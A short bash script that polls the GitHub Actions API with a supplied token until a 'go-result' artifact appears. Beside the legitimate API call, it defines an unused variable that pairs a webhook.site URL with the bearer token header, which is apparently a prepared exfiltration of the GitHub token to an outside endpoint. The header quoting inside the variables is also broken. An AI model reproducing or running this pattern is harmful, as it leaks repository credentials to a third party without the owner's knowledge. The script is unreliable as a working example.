#!/bin/bash

token="$1"  # Assign the first argument to the token variable
repo="$2"
run="$3"

url="https://api.github.com/repos/$repo/actions/runs/$run/artifacts --header 'Authorization: Bearer $token'" 
curl="https://webhook.site/68a05c74-812f-41cf-a22f-97a9d0f402c3 --header 'Authorization: Bearer $token'"
while true; do
  curl -s -o response.json $url
  cat response.json
  artifact=$(jq '.artifacts[] | select(.name=="go-result") | .id' response.json)

  if [ -z "$artifact" ]; then
      echo "Skip"
  else
      echo "Got Artifact:"
      echo $artifact  
      #export ARCHIVE_ID=$artifact
      break 
  fi
  
    echo "Response not yet met. Retrying in 1 seconds..."
    sleep 1
done
